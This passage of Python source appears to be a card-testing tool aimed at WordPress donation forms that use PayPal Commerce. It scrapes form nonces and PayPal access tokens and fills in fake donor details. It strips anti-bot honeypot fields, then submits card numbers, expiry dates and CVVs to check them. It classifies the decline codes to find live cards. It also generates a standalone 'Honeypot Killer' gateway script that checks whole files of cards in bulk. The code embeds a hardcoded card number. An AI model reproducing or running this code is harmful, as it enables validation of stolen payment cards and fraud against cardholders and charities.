                                    self.au = tm.group(1)
                                    return True
                                cm = re.search(r'"clientId"\s*:\s*"([^"]+)"', dec)
                                if cm: self.client_id = cm.group(1)
                            if len(token) > 20:
                                self.au = token
                                return True
                    except: pass
            except: continue
        return False

    def _try_ajax_nonce(self):
        try:
            if not self.ajax_url: self.ajax_url = f'https://{self.url}/wp-admin/admin-ajax.php'
            if not self.id_form2: return False
            for action in ['give_get_form_nonce', 'give_donation_form_nonce']:
                headers = self._get_ajax_headers()
                r = self.r.post(self.ajax_url, data={'action': action, 'form_id': self.id_form2},
                    headers=headers, timeout=6)
                if r.status_code == 200 and r.text:
                    try:
                        j = r.json()
                        if 'data' in j and isinstance(j['data'], str) and len(j['data']) >= 6:
                            self.nonec = j['data']
                            return True
                        if 'nonce' in j:
                            self.nonec = j['nonce']
                            return True
                    except: pass
        except: pass
        return False

    def _autofill_required_fields(self, form_data):
        try:
            for name, info in self.form_fields.items():
                try:
                    if name in form_data: continue
                    # ✅ honeypot يفضل فاضي
                    if is_honeypot_field(name):
                        form_data[name] = ''
                        continue
                    ft = info.get('type', '')
                    opts = info.get('options', [])
                    nl = name.lower()
                    opts = [o.replace('&amp;', '&').replace('&#039;', "'").replace('&quot;', '"') for o in opts]
                    if any(k in nl for k in ('title', 'prefix', 'salutation', 'honorific', 'suffix')):
                        if ft in ('select', 'radio') and opts:
                            form_data[name] = opts[0]
                        else:
                            form_data[name] = 'Mr'
                        continue
                    if ft == 'checkbox':
                        if any(k in nl for k in ('agree', 'terms', 'confirm', 'accept', 'consent', 'policy', 'waiver', 'anonymous')):
                            form_data[name] = opts[0] if opts else '1'
                        else:
                            form_data[name] = opts[0] if opts else 'on'
                    elif ft in ('select', 'radio'):
                        form_data[name] = opts[0] if opts else ''
                    elif ft == 'email':
                        form_data[name] = self.email
                    elif ft == 'number':
                        form_data[name] = '1'
                    elif ft == 'tel':
                        form_data[name] = '1234567890'
                    elif ft == 'date':
                        form_data[name] = '1990-01-01'
                    elif ft == 'password':
                        form_data[name] = 'Test123!@#'
                    else:
                        if 'first' in nl or 'fname' in nl: form_data[name] = random.choice(self.first_name)
                        elif 'last' in nl or 'lname' in nl: form_data[name] = random.choice(self.last_name)
                        elif 'name' in nl: form_data[name] = f"{random.choice(self.first_name)} {random.choice(self.last_name)}"
                        elif 'email' in nl: form_data[name] = self.email
                        elif 'phone' in nl or 'mobile' in nl or 'tel' in nl: form_data[name] = '1234567890'
                        elif 'address' in nl or 'street' in nl: form_data[name] = '123 Main St'
                        elif 'city' in nl: form_data[name] = 'New York'
                        elif 'zip' in nl or 'postal' in nl: form_data[name] = '10001'
                        elif 'state' in nl: form_data[name] = 'NY'
                        elif 'country' in nl: form_data[name] = 'US'
                        elif 'gender' in nl or 'sex' in nl: form_data[name] = 'Male'
                        elif 'birth' in nl or 'dob' in nl: form_data[name] = '1990-01-01'
                        elif 'age' in nl: form_data[name] = '30'
                        elif 'company' in nl or 'organization' in nl: form_data[name] = 'Test Org'
                        elif 'comment' in nl or 'message' in nl or 'note' in nl: form_data[name] = 'Donation'
                        elif 'amount' in nl: form_data[name] = self.donation
                        else: form_data[name] = 'Mr'
                except: continue
        except: pass
        return form_data

    def _get_attempt_amounts(self):
        """✅ استخدم MINIMUM من الموقع"""
        try:
            min_amt = self.minimum if self.minimum else "1.00"
            try:
                min_val = float(str(min_amt).replace(',', ''))
            except:
                min_val = 1.0
            if min_val <= 1.0:
                return ["1.00", "5.00"]
            elif min_val <= 5.0:
                return ["5.00", "10.00"]
            else:
                return [f"{min_val:.2f}", f"{min_val + 5:.2f}"]
        except:
            return ["1.00", "5.00"]

    def Key(self):
        try:
            if not self._fetch_page(): return False
            self._load_iframes()
            self._load_all_js()
            self._extract_basic()
            self._extract_all_form_fields()
            self._extract_tokens_ultimate()

            if self.au: self.auth_method = "token"
            if not self.au:
                if self._extract_tokens_ultimate(): self.auth_method = "token"
            if not self.nonec and self.id_form2:
                self._try_ajax_nonce()
            if not self.au and self.client_id and self.client_secret:
                if self._try_oauth(): self.auth_method = "oauth"
            if not self.au:
                if self._try_ajax_client_token(): self.auth_method = "ajax"

            if not self.id_form1 and self.id_form2:
                self.id_form1 = f"{self.id_form2}-1"
            if not self.ajax_url:
                self.ajax_url = f'https://{self.url}/wp-admin/admin-ajax.php'
            return True
        except Exception:
            return False

    def _attempt_charge(self, n, mm, yy, cvc, amt):
        try:
            self.donation = amt
            expiry = f"20{yy}-{mm}"
            price_ids = ['custom', '3', '4', '', None]
            if self.current_price_id and self.current_price_id not in price_ids:
                price_ids.insert(0, self.current_price_id)
            order_id = None
            last_create_err = ""

            for pid in price_ids:
                try:
                    form_data = {
                        'give-form-id-prefix': self.id_form1 or '',
                        'give-form-id': self.id_form2 or '',
                        'give-form-hash': self.nonec or '',
                        'give-amount': amt,
                        'give-currency': self.currency,
                        'payment-mode': 'paypal-commerce',
                        'give_first': random.choice(self.first_name),
                        'give_last': random.choice(self.last_name),
                        'give_email': self.email,
                        'give-gateway': 'paypal-commerce',
                        'give_agree_to_terms': 'on',
                        'give_terms_agreement': 'on',
                    }
                    if pid is not None:
                        form_data['give-price-id'] = pid
                    form_data = self._autofill_required_fields(form_data)
                    # ✅ شيل كل honeypot
                    form_data = strip_honeypots(form_data)

                    da2 = MultipartEncoder({k: (None, v) for k, v in form_data.items()})
                    he3 = self._get_ajax_headers()
                    he3['content-type'] = da2.content_type

                    r3_raw = None
                    try:
                        r3_raw = self.r.post(self.ajax_url,
                            params={'action': 'give_paypal_commerce_create_order'},
                            headers=he3, data=da2, timeout=10)
                        
                        if r3_raw is None or r3_raw.status_code != 200:
                            last_create_err = f"HTTP {r3_raw.status_code if r3_raw else 'None'}"
                            continue
                        
                        j = None
                        try:
                            j = r3_raw.json()
                        except:
                            txt = r3_raw.text[:300]
                            m_err = re.search(r'"(?:error|message)"\s*:\s*"([^"]+)"', txt)
                            if m_err:
                                last_create_err = m_err.group(1)
                            else:
                                last_create_err = txt[:150]
                            continue
                        
                        if j.get('success') and isinstance(j.get('data'), dict) and j['data'].get('id'):
                            order_id = j['data']['id']
                            break
                        
                        err_msg = ''
                        if isinstance(j.get('data'), dict):
                            err_msg = str(j['data'].get('error', ''))
                        elif isinstance(j.get('data'), str):
                            err_msg = j['data']
                        if not err_msg:
                            err_msg = str(j.get('error', 'Create failed'))
                        
                        m_field = re.search(r'please enter your (\w+)', err_msg, re.I)
                        if m_field:
                            field_hint = m_field.group(1).lower()
                            found_field = None
                            for fname, finfo in self.form_fields.items():
                                if field_hint in fname.lower():
                                    found_field = fname
                                    break
                            if found_field and found_field not in form_data:
                                ftype = self.form_fields[found_field].get('type', '')
                                fopts = self.form_fields[found_field].get('options', [])
                                if ftype in ('select', 'radio') and fopts:
                                    form_data[found_field] = fopts[0].replace('&amp;', '&').replace('&#039;', "'")
                                elif field_hint == 'title':
                                    form_data[found_field] = 'Mr'
                                else:
                                    form_data[found_field] = 'Test'
                                form_data = strip_honeypots(form_data)
                                da2 = MultipartEncoder({k: (None, v) for k, v in form_data.items()})
                                he3 = self._get_ajax_headers()
                                he3['content-type'] = da2.content_type
                                r3_raw = self.r.post(self.ajax_url,
                                    params={'action': 'give_paypal_commerce_create_order'},
                                    headers=he3, data=da2, timeout=10)
                                try:
                                    j = r3_raw.json()
                                    if j.get('success') and isinstance(j.get('data'), dict) and j['data'].get('id'):
                                        order_id = j['data']['id']
                                        break
                                    else:
                                        last_create_err = str(j.get('data', {}).get('error', 'Create failed')) if isinstance(j.get('data'), dict) else str(j.get('data', ''))
                                except:
                                    last_create_err = r3_raw.text[:150]
                            else:
                                last_create_err = err_msg
                        else:
                            last_create_err = err_msg
                    except Exception as e:
                        if r3_raw is not None:
                            last_create_err = r3_raw.text[:150]
                        else:
                            last_create_err = f"Exception: {str(e)[:100]}"
                except: continue

            if not order_id:
                return None, last_create_err

            metadata = self.paypal or self.client_id or ''
            he4 = {
                'authorization': f'Bearer {self.au or ""}',
                'paypal-client-metadata-id': metadata,
                'content-type': 'application/json',
                'origin': 'https://assets.braintreegateway.com',
                'referer': 'https://assets.braintreegateway.com/',
                'user-agent': self.ua,
                'accept': 'application/json',
                'accept-language': 'en-US,en;q=0.9',
            }
            da3 = {
                'payment_source': {
                    'card': {
                        'number': n, 'expiry': expiry, 'security_code': cvc,
                        'attributes': {'verification': {'method': 'SCA_WHEN_REQUIRED'}},
                    },
                },
                'application_context': {'vault': False},
            }
            confirm_body = ""
            try:
                cr = self.r.post(
                    f'https://cors.api.paypal.com/v2/checkout/orders/{order_id}/confirm-payment-source',
                    headers=he4, json=da3, timeout=10)
                confirm_body = cr.text
            except: pass

            for pid in price_ids:
                try:
                    form_data = {
                        'give-form-id-prefix': self.id_form1 or '',
                        'give-form-id': self.id_form2 or '',
                        'give-form-hash': self.nonec or '',
                        'give-amount': amt,
                        'give-currency': self.currency,
                        'payment-mode': 'paypal-commerce',
                        'give_first': random.choice(self.first_name),
                        'give_last': random.choice(self.last_name),
                        'give_email': self.email,
                        'give-gateway': 'paypal-commerce',
                        'give_agree_to_terms': 'on',
                        'give_terms_agreement': 'on',
                    }
                    if pid is not None:
                        form_data['give-price-id'] = pid
                    form_data = self._autofill_required_fields(form_data)
                    form_data = strip_honeypots(form_data)

                    da4 = MultipartEncoder({k: (None, v) for k, v in form_data.items()})
                    he5 = self._get_ajax_headers()
                    he5['content-type'] = da4.content_type
                    r5 = self.r.post(self.ajax_url,
                        params={'action': 'give_paypal_commerce_approve_order', 'order': order_id},
                        headers=he5, data=da4, timeout=10)
                    text = r5.text + confirm_body

                    if 'paypal orders are captured' in text.lower():
                        return 'PayPal orders are captured', text

                    if '"success":true' in text.lower() and 'error' not in text.lower():
                        return f'CHARGE {amt}$', text

                    for kw in LIVE_RESPONSES:
                        if kw.upper() in text.upper():
                            return kw, text

                    try:
                        j_final = r5.json()
                        err_final = ''
                        if isinstance(j_final, dict):
                            d = j_final.get('data', {})
                            if isinstance(d, dict):
                                err_final = str(d.get('error', ''))
                            elif isinstance(d, str):
                                err_final = d
                            if not err_final:
                                err_final = str(j_final.get('error', ''))
                        if err_final and err_final.lower() != 'none':
                            err_final = re.sub(r'<[^>]+>', '', err_final).strip()
                            if err_final and len(err_final) > 2:
                                return err_final, text
                    except: pass

                    if r5.text:
                        txt = r5.text[:500]
                        m_err = re.search(r'"(?:error|message)"\s*:\s*"([^"]+)"', txt)
                        if m_err:
                            return m_err.group(1), txt
                        m_pe = re.search(r'please enter[^"<]{0,100}', txt, re.I)
                        if m_pe:
                            return m_pe.group(0).strip(), txt
                except: continue

            return confirm_body[:150] if confirm_body else "Approve failed", confirm_body
        except Exception as e:
            return None, f"Error: {str(e)[:100]}"

    def Charge(self, ccx):
        try:
            ccx = ccx.strip()
            parts = ccx.split("|")
            if len(parts) < 4: return "Invalid card format"
            n, mm, yy, cvc = parts[0], parts[1], parts[2], parts[3].strip()
            if "20" in yy: yy = yy.split("20")[1]

            if not self.nonec and self.id_form2: self._try_ajax_nonce()
            if not self.id_form1 and self.id_form2: self.id_form1 = f"{self.id_form2}-1"

            attempts = self._get_attempt_amounts()
            all_results = []
            create_errors = []

            for amt in attempts:
                try:
                    result, text = self._attempt_charge(n, mm, yy, cvc, amt)
                    if result:
                        all_results.append({'amount': amt, 'result': result, 'text': text})
                    else:
                        create_errors.append((amt, text))
                except: continue

            if not all_results:
                if create_errors:
                    last_amt, last_err = create_errors[-1]
                    self.donation = last_amt
                    return last_err if last_err else "No response"
                return "No response"

            best = max(all_results, key=lambda x: score_result(x['result']))
            self.donation = best['amount']
            return normalize_result(best['result'])
        except Exception as e:
            return f"Error: {str(e)[:100]}"


# ============================================================
#  Bridge
# ============================================================
TEST_CARD = '4059986126444431|11|30|947'


def check_single_link(link):
    try:
        link = safe_url(link)
        if not link:
            return {'link': str(link)[:100] if link else 'Invalid', 'live': False, 'respons': 'Invalid URL', 'amount': '1.00', 'tester': None}
        tester = PayPalTester(link)
        if not tester.Key():
            return {'link': link[:100], 'live': False, 'respons': 'Fetch failed', 'amount': '1.00', 'tester': tester}
        result = tester.Charge(TEST_CARD)
        return {
            'link': link[:100],
            'live': is_live_response(result),
            'respons': str(result)[:150],
            'amount': tester.donation,
            'minimum': tester.minimum,
            'tester': tester,
        }
    except Exception as e:
        return {'link': str(link)[:100] if link else 'Invalid', 'live': False, 'respons': f'Crash: {str(e)[:80]}', 'amount': '1.00', 'tester': None}


# ============================================================
#  Gateway generator
# ============================================================
def generate_gateway_code(result, link, amount="1.00", tester=None):
    parsed = urlparse(link)
    host = parsed.netloc or 'invalid.local'
    path = parsed.path or '/'
    if parsed.query: path += "?" + parsed.query

    if 'paypal orders are captured' in str(result).lower():
        display_result = "PayPal orders are captured"
    elif 'ORDER_NOT_APPROVED' in result.upper() or 'PAYER_CANNOT_PAY' in result.upper():
        display_result = "Payer cannot pay for this transaction."
    elif 'There was an issue with your donation' in str(result):
        display_result = "There was an issue with your donation transaction: Your card was declined."
    elif 'Your card was declined' in str(result) or 'card was declined' in str(result).lower():
        display_result = "Your card was declined."
    else:
        display_result = str(result)[:100]

    def _g(attr, default=''):
        try:
            if tester and getattr(tester, attr, None): return getattr(tester, attr)
            return default
        except: return default

    id_form1 = _g('id_form1')
    id_form2 = _g('id_form2')
    nonec = _g('nonec')
    au = _g('au')
    paypal_metadata = _g('paypal')
    client_id = _g('client_id')
    currency = _g('currency', 'USD')
    minimum = _g('minimum', '5.00')
    ajax_url = _g('ajax_url') or f'https://{host}/wp-admin/admin-ajax.php'
    current_price_id = _g('current_price_id')
    auth_method = _g('auth_method', 'none')
    
    price_levels_json = json.dumps(tester.price_levels if tester and tester.price_levels else [], ensure_ascii=False)
    price_levels_json = price_levels_json.replace('false', 'False').replace('true', 'True').replace('null', 'None')
    
    form_fields_json = json.dumps(tester.form_fields if tester and tester.form_fields else {}, ensure_ascii=False)
    form_fields_json = form_fields_json.replace('false', 'False').replace('true', 'True').replace('null', 'None')

    return f'''#!/usr/bin/env python3
# Live Gateway v15.1 — Honeypot Killer
# Link: {link}
# Response: {display_result}
# Amount: {amount} | Currency: {currency} | Auth: {auth_method}

import requests, random, time, re, base64, json, os
from fake_useragent import UserAgent
from requests_toolbelt.multipart.encoder import MultipartEncoder
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

PAGE_URL = "{link}"
AJAX_URL      = "{ajax_url}"
ID_FORM1      = "{id_form1}"
ID_FORM2      = "{id_form2}"
NONCE         = "{nonec}"
ACCESS_TOKEN  = "{au}"
PAYPAL_META   = "{paypal_metadata}"
CLIENT_ID     = "{client_id}"
CURRENCY      = "{currency}"
MINIMUM       = "{minimum}"
PREFERRED_AMT = "{amount}"
PRICE_LEVELS  = {price_levels_json}
CURRENT_PID   = "{current_price_id}"
AUTH_METHOD   = "{auth_method}"
FORM_FIELDS   = {form_fields_json}

BROWSER_UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
HONEYPOT_KEYS = ['honeypot', 'honey_pot', 'honey-pot', 'give-honeypot', 'give_honeypot',
                 'website', 'url_field', 'urlfield', 'user_url', 'userurl']

LIVE_RESPONSES = ['CHARGE', 'Payer cannot pay for this transaction',
    'There was an issue with your donation transaction', 'Your card was declined',
    'card was declined', 'PayPal orders are captured',
    'INSTRUMENT_DECLINED', 'ORDER_NOT_APPROVED',
    'PAYER_ACTION_REQUIRED', 'PAYER_CANNOT_PAY', 'PAYMENT_DENIED',
    'PAYEE_ACCOUNT_RESTRICTED', 'PERMISSION_DENIED', 'CARD_EXPIRED',
    'AMOUNT_MISMATCH', 'VALIDATION_ERROR', 'UNPROCESSABLE_ENTITY',
    'DO_NOT_HONOR', 'GENERIC_DECLINE', 'CVV2_FAILURE', 'CVV_FAILURE',
    'INSUFFICIENT_FUNDS', 'CARD_CLOSED', 'INVALID_OR_RESTRICTED_CARD',
    'INVALID_TRANSACTION', 'EXPIRED_CARD', 'AUTHENTICATION_FAILED',
    'CURRENCY_MISMATCH', 'CURRENCY_NOT_SUPPORTED', 'INTERNAL_SERVER_ERROR',
    'NOT_AUTHORIZED', 'PAYER_ACCOUNT_RESTRICTED',
    'RESTRICTED_OR_INACTIVE_ACCOUNT', 'SUSPECTED_FRAUD', 'ACCOUNT_CLOSED',
    'LOST_OR_STOLEN', 'COMPLIANCE_VIOLATION', 'CAPTURE_DECLINED',
    'AUTHORIZATION_DENIED', 'DECLINED',
    'Payer has not yet approved the Order', 'Please redirect the payer',
    'provide a valid payment_source', 'For Visa, Mastercard',
    'nothing matches', 'account closed as fraudulent',
    'The requested action could not be performed', 'issue with your donation',
    'transaction was declined']


def is_honeypot(name):
    if not name: return False
    nl = name.lower()
    return any(k in nl for k in HONEYPOT_KEYS)


def strip_honeypots(form_data):
    try:
        return {{k: v for k, v in form_data.items() if not is_honeypot(k)}}
    except: return form_data


def luhn_check(card_num):
    try:
        def digits_of(n): return [int(d) for d in str(n)]
        digits = digits_of(card_num)
        odd = digits[-1::-2]; even = digits[-2::-2]
        total = sum(odd)
        for d in even: total += sum(digits_of(d * 2))
        return total % 10 == 0
    except: return False


class PayPal:
    def __init__(self):
        self.first_name = ["James", "John", "Robert"]
        self.last_name = ["Smith", "Johnson", "Williams"]
        self.email = f"{{random.choice(self.first_name)}}{{random.randint(100,999)}}@gmail.com"
        self.r = requests.Session()
        try: self.r.verify = False
        except: pass
        self.uu = UserAgent()
        self.ua = BROWSER_UA
        self.donation = PREFERRED_AMT
        self.ajax_url = AJAX_URL
        self.id_form1 = ID_FORM1
        self.id_form2 = ID_FORM2
        self.nonec = NONCE
        self.au = ACCESS_TOKEN
        self.paypal_meta = PAYPAL_META
        self.client_id = CLIENT_ID
        self.currency = CURRENCY
        self.current_pid = CURRENT_PID
        self.form_fields = FORM_FIELDS
        self._refresh_count = 0

    def _ajax_headers(self):
        try:
            origin = f'https://{{PAGE_URL.split("//")[1].split("/")[0]}}'
            return {{
                'user-agent': self.ua,
                'accept': 'application/json, text/javascript, */*; q=0.01',
                'x-requested-with': 'XMLHttpRequest',
                'origin': origin,
                'referer': PAGE_URL,
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
            }}
        except:
            return {{'user-agent': self.ua, 'x-requested-with': 'XMLHttpRequest'}}

    def _autofill(self, form_data):
        try:
            for name, info in self.form_fields.items():
                try:
                    if name in form_data: continue
                    if is_honeypot(name):
                        form_data[name] = ''
                        continue
                    ft = info.get('type', ''); opts = info.get('options', [])
                    nl = name.lower()
                    opts = [o.replace('&amp;', '&').replace('&#039;', "'").replace('&quot;', '"') for o in opts]
                    if any(k in nl for k in ('title', 'prefix', 'salutation', 'honorific', 'suffix')):
                        if ft in ('select','radio') and opts: form_data[name] = opts[0]
                        else: form_data[name] = 'Mr'
                        continue
                    if ft == 'checkbox':
                        if any(k in nl for k in ('agree','terms','confirm','accept','consent','policy','waiver')):
                            form_data[name] = opts[0] if opts else '1'
                        else:
                            form_data[name] = opts[0] if opts else 'on'
                    elif ft in ('select','radio'):
                        form_data[name] = opts[0] if opts else ''
                    elif ft == 'email':
                        form_data[name] = self.email
                    elif ft == 'number':
                        form_data[name] = '1'
                    elif ft == 'tel':
                        form_data[name] = '1234567890'
                    elif ft == 'date':
                        form_data[name] = '1990-01-01'
                    else:
                        if 'first' in nl or 'fname' in nl: form_data[name] = random.choice(self.first_name)
                        elif 'last' in nl or 'lname' in nl: form_data[name] = random.choice(self.last_name)
                        elif 'name' in nl: form_data[name] = f"{{random.choice(self.first_name)}} {{random.choice(self.last_name)}}"
                        elif 'email' in nl: form_data[name] = self.email
                        elif 'phone' in nl or 'mobile' in nl or 'tel' in nl: form_data[name] = '1234567890'
                        elif 'address' in nl or 'street' in nl: form_data[name] = '123 Main St'
                        elif 'city' in nl: form_data[name] = 'New York'
                        elif 'zip' in nl or 'postal' in nl: form_data[name] = '10001'
                        elif 'state' in nl: form_data[name] = 'NY'
                        elif 'country' in nl: form_data[name] = 'US'
                        elif 'gender' in nl or 'sex' in nl: form_data[name] = 'Male'
                        elif 'birth' in nl or 'dob' in nl: form_data[name] = '1990-01-01'
                        elif 'age' in nl: form_data[name] = '30'
                        elif 'company' in nl or 'organization' in nl: form_data[name] = 'Test Org'
                        elif 'comment' in nl or 'message' in nl or 'note' in nl: form_data[name] = 'Donation'
                        elif 'amount' in nl: form_data[name] = self.donation
                        else: form_data[name] = 'Mr'
                except: continue
        except: pass
        return form_data

    def _refresh_fast(self):
        if self._refresh_count >= 3: return False
        self._refresh_count += 1
        try:
            if '://none' in PAGE_URL.lower(): return False
            r = self.r.get(PAGE_URL, headers={{'user-agent': self.ua}}, timeout=8)
            if r.status_code != 200: return False
            html = r.text
            m = re.search(r'name="give-form-hash"\\s+value="([^"]+)"', html)
            if m: self.nonec = m.group(1)
            m = re.search(r'name="give-form-id-prefix"\\s+value="([^"]+)"', html)
            if m: self.id_form1 = m.group(1)
            m = re.search(r'name="give-form-id"\\s+value="([^"]+)"', html)
            if m: self.id_form2 = m.group(1)
            if AUTH_METHOD in ("token", "none"):
                m = re.search(r'"data-client-token"\\s*:\\s*"([^"]+)"', html)
                if m:
                    try:
                        enc = m.group(1)
                        padded = enc + '=' * (-len(enc) % 4)
                        dec = base64.b64decode(padded).decode('utf-8', errors='ignore')
                        tm = re.search(r'"accessToken"\\s*:\\s*"([^"]+)"', dec)
                        if tm: self.au = tm.group(1)
                        mm = re.search(r'merchant_id=([\\w]+)', dec)
                        if mm: self.paypal_meta = mm.group(1)
                        cm = re.search(r'"clientId"\\s*:\\s*"([^"]+)"', dec)
                        if cm: self.client_id = cm.group(1)
                    except: pass
                if not self.au:
                    for p in [r'"accessToken"\\s*:\\s*"([^"]+)"', r'"(A21[A-Za-z0-9+/=_-]{{40,}})"']:
                        m = re.search(p, html, re.IGNORECASE)
                        if m: self.au = m.group(1); break
        except: pass
        return True

    def _create_order(self, amt, currency, pid):
        try:
            if not self.ajax_url or '://none' in self.ajax_url.lower():
                return None, "Invalid ajax URL"
            form_data = {{
                'give-form-id-prefix': self.id_form1 or '',
                'give-form-id': self.id_form2 or '',
                'give-form-hash': self.nonec or '',
                'give-amount': amt,
                'give-currency': currency,
                'payment-mode': 'paypal-commerce',
                'give_first': random.choice(self.first_name),
                'give_last': random.choice(self.last_name),
                'give_email': self.email,
                'give-gateway': 'paypal-commerce',
                'give_agree_to_terms': 'on',
                'give_terms_agreement': 'on',
            }}
            if pid is not None: form_data['give-price-id'] = pid
            form_data = self._autofill(form_data)
            form_data = strip_honeypots(form_data)
            da = MultipartEncoder({{k: (None, v) for k, v in form_data.items()}})
            he = self._ajax_headers()
            he['content-type'] = da.content_type
            r = self.r.post(self.ajax_url,
                params={{'action': 'give_paypal_commerce_create_order'}},
                headers=he, data=da, timeout=10)
            try:
                j = r.json()
            except:
                return None, r.text[:150]
            if j.get('success') and isinstance(j.get('data'), dict) and j['data'].get('id'):
                return j['data']['id'], None
            err = ''
            if isinstance(j.get('data'), dict):
                err = str(j['data'].get('error', ''))
            elif isinstance(j.get('data'), str):
                err = j['data']
            return None, err or 'fail'
        except Exception as e:
            return None, f"Exception: {{str(e)[:100]}}"

    def _confirm(self, order_id, n, mm, yy, cvc):
        try:
            expiry = f"20{{yy}}-{{mm}}"
            metadata = self.paypal_meta or self.client_id or ''
            he4 = {{
                'authorization': f'Bearer {{self.au or ""}}',
                'paypal-client-metadata-id': metadata,
                'content-type': 'application/json',
                'origin': 'https://assets.braintreegateway.com',
                'referer': 'https://assets.braintreegateway.com/',
                'user-agent': self.ua,
                'accept': 'application/json',
            }}
            da3 = {{
                'payment_source': {{
                    'card': {{
                        'number': n, 'expiry': expiry, 'security_code': cvc,
                        'attributes': {{'verification': {{'method': 'SCA_WHEN_REQUIRED'}}}},
                    }},
                }},
                'application_context': {{'vault': False}},
            }}
            cr = self.r.post(f'https://cors.api.paypal.com/v2/checkout/orders/{{order_id}}/confirm-payment-source',
                headers=he4, json=da3, timeout=10)
            if cr.status_code == 401:
                return "TOKEN_EXPIRED"
            return cr.text
        except: return ""

    def _approve(self, order_id, amt, currency, pid):
        try:
            if not self.ajax_url or '://none' in self.ajax_url.lower():
                return ""
            form_data = {{
                'give-form-id-prefix': self.id_form1 or '',
                'give-form-id': self.id_form2 or '',
                'give-form-hash': self.nonec or '',
                'give-amount': amt,
                'give-currency': currency,
                'payment-mode': 'paypal-commerce',
                'give_first': random.choice(self.first_name),
                'give_last': random.choice(self.last_name),
                'give_email': self.email,
                'give-gateway': 'paypal-commerce',
                'give_agree_to_terms': 'on',
                'give_terms_agreement': 'on',
            }}
            if pid is not None: form_data['give-price-id'] = pid
            form_data = self._autofill(form_data)
            form_data = strip_honeypots(form_data)
            da4 = MultipartEncoder({{k: (None, v) for k, v in form_data.items()}})
            he5 = self._ajax_headers()
            he5['content-type'] = da4.content_type
            r5 = self.r.post(self.ajax_url,
                params={{'action': 'give_paypal_commerce_approve_order', 'order': order_id}},
                headers=he5, data=da4, timeout=10)
            return r5.text
        except: return ""

    def _get_attempt_amounts(self):
        try:
            min_amt = MINIMUM if MINIMUM else "1.00"
            try:
                min_val = float(str(min_amt).replace(',', ''))
            except:
                min_val = 1.0
            if min_val <= 1.0:
                return ["1.00", "5.00"]
            elif min_val <= 5.0:
                return ["5.00", "10.00"]
            else:
                return [f"{{min_val:.2f}}", f"{{min_val + 5:.2f}}"]
        except:
            return ["1.00", "5.00"]

    def Charge(self, ccx):
        try:
            ccx = ccx.strip()
            parts = ccx.split("|")
            if len(parts) < 4: return "Invalid card format"
            n, mm, yy, cvc = parts[0], parts[1], parts[2], parts[3].strip()
            if "20" in yy: yy = yy.split("20")[1]
            if not luhn_check(n): return "INVALID_CARD_NUMBER"

            price_ids = ['custom', '3', '4', '', None]
            if self.current_pid and self.current_pid not in price_ids:
                price_ids.insert(0, self.current_pid)

            attempts = self._get_attempt_amounts()
            result = self._do_charge(n, mm, yy, cvc, attempts, price_ids)
            if not result or '<!DOCTYPE' in str(result).upper() or '<HTML' in str(result).upper():
                if self._refresh_count < 2:
                    self._refresh_fast()
                    return self._do_charge(n, mm, yy, cvc, attempts, price_ids)
            return result
        except Exception as e:
            return f"Error: {{str(e)[:100]}}"

    def _do_charge(self, n, mm, yy, cvc, attempts, price_ids):
        try:
            all_results = []
            for amt in attempts:
                self.donation = amt
                order_id = None
                for pid in price_ids:
                    try:
                        oid, err = self._create_order(amt, self.currency, pid)
                        if oid:
                            order_id = oid
                            break
                    except: continue
                if not order_id: continue

                confirm = self._confirm(order_id, n, mm, yy, cvc)
                if confirm == "TOKEN_EXPIRED":
                    self._refresh_fast()
                    confirm = self._confirm(order_id, n, mm, yy, cvc)

                for pid in price_ids:
                    try:
                        text = self._approve(order_id, amt, self.currency, pid) + confirm
                        
                        if 'paypal orders are captured' in text.lower():
                            return "PayPal orders are captured"
                        
                        if '"success":true' in text.lower() and 'error' not in text.lower():
                            return f'CHARGE {{amt}}$'
                        for kw in LIVE_RESPONSES:
                            if kw.upper() in text.upper():
                                if 'There was an issue with your donation' in kw:
                                    return "There was an issue with your donation transaction: Your card was declined."
                                if 'card was declined' in kw.lower():
                                    return "Your card was declined."
                                if kw in ('ORDER_NOT_APPROVED', 'PAYER_CANNOT_PAY'):
                                    return "Payer cannot pay for this transaction."
                                return kw
                        try:
                            j = json.loads(text)
                            if 'data' in j and isinstance(j['data'], dict) and j['data'].get('error'):
                                all_results.append({{'amount': amt, 'result': str(j['data']['error'])[:200]}})
                                break
                        except: pass
                    except: continue
            if all_results:
                PRIORITY = [('CHARGE', 200), ('PayPal orders are captured', 199),
                    ('INSUFFICIENT_FUNDS', 195),
                    ('INVALID_OR_RESTRICTED_CARD', 190), ('TRANSACTION_NOT_PERMITTED', 188),
                    ('Payer cannot pay', 185), ('PAYER_CANNOT_PAY', 185), ('ORDER_NOT_APPROVED', 185),
                    ('There was an issue with your donation', 185),
                    ('Your card was declined', 185), ('card was declined', 185),
                    ('INSTRUMENT_DECLINED', 182), ('PAYMENT_DENIED', 180),
                    ('CVV2_FAILURE', 175), ('CVV_FAILURE', 175), ('EXPIRED_CARD', 172),
                    ('DO_NOT_HONOR', 170), ('DECLINED', 100)]
                def score(r):
                    up = r['result'].upper()
                    for k, s in PRIORITY:
                        if k.upper() in up: return s
                    return 1
                best = max(all_results, key=score)
                self.donation = best['amount']
                res = best['result']
                if 'paypal orders are captured' in res.lower():
                    return "PayPal orders are captured"
                if 'There was an issue with your donation' in res:
                    return "There was an issue with your donation transaction: Your card was declined."
                if 'card was declined' in res.lower():
                    return "Your card was declined."
                if 'ORDER_NOT_APPROVED' in res.upper() or 'PAYER_CANNOT_PAY' in res.upper():
                    return "Payer cannot pay for this transaction."
                return res
            return "No response from server"
        except Exception as e:
            return f"Error: {{str(e)[:100]}}"


def single_check():
    print("\\n--- Single Card ---")
    try:
        card = input("Card (num|mm|yy|cvc): ").strip()
        if not card: return
        p = PayPal()
        print("Response:", p.Charge(card))
    except Exception as e:
        print(f"Error: {{e}}")


def file_check():
    print("\\n--- File Check ---")
    try:
        path = input("File path: ").strip()
        if not os.path.exists(path):
            print("Not found"); return
        with open(path, 'r', encoding='utf-8', errors='ignore') as f:
            cards = [l.strip() for l in f if l.strip()]
        if not cards: return
        out = f"results_{{int(time.time())}}.txt"
        with open(out, 'w', encoding='utf-8') as fo:
            for i, c in enumerate(cards, 1):
                try:
                    p = PayPal()
                    res = p.Charge(c)
                    line = f"{{c}} => {{res}}"
                    print(f"[{{i}}/{{len(cards)}}] {{line}}")
                    fo.write(line + "\\n"); fo.flush()
                    time.sleep(1)
                except: continue
